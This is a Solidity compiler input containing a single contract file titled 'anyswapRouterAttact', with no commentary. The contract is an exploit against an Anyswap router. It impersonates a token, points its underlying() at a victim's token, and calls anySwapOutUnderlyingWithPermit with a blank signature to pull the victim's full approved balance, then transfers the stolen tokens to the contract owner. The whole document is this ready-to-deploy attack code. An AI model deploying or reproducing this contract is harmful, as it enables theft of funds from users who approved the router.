{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"anyswapRouterAttact.sol":{"content":"//SPDX-License-Identifier: Unlicense\r\npragma solidity ^0.8.0;\r\n\r\ninterface AnyswapV4Router {\r\n    function anySwapOutUnderlyingWithPermit(\r\n        address from,\r\n        address token,\r\n        address to,\r\n        uint256 amount,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s,\r\n        uint256 toChainID\r\n    ) external;\r\n}\r\n\r\ninterface IPancakeERC20 {\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n// OpenZeppelin Contracts v4.3.2 (access/Ownable.sol)\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\ncontract V1ERC20Token is Ownable  {\r\n\r\n    address public underlying_token;\r\n\r\n    function underlying() external view  returns (address) {\r\n        \r\n        // return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        return underlying_token;\r\n    }\r\n\r\n    function burn(address from, uint256 amount)\r\n        external\r\n    \r\n        returns (bool)\r\n    {\r\n        return true;\r\n    }\r\n\r\n    function depositVault(uint256 amount, address to)\r\n        external\r\n      \r\n        returns (uint256)\r\n    {\r\n        return amount;\r\n    }\r\n\r\n\r\n\r\n    function callAnyswapRouter(address router, address _underlying_token, address from) public onlyOwner  {\r\n\r\n        underlying_token = _underlying_token;\r\n        \r\n        address useless_to_address = address(this);\r\n\r\n     \r\n\r\n        uint maxAmount = IPancakeERC20(underlying_token).balanceOf(from);\r\n\r\n      \r\n\r\n        uint256 deadline = block.timestamp + 20 minutes;\r\n\r\n       \r\n\r\n        \r\n                \r\n        AnyswapV4Router(router).anySwapOutUnderlyingWithPermit(            from,            address(this),            useless_to_address,            maxAmount,            deadline,            0,            bytes32(0),            bytes32(0),            56        );\r\n\r\n        IPancakeERC20 (underlying_token).transfer(msg.sender, maxAmount);\r\n\r\n        \r\n    \r\n\r\n\r\n    }\r\n}\r\n"}}}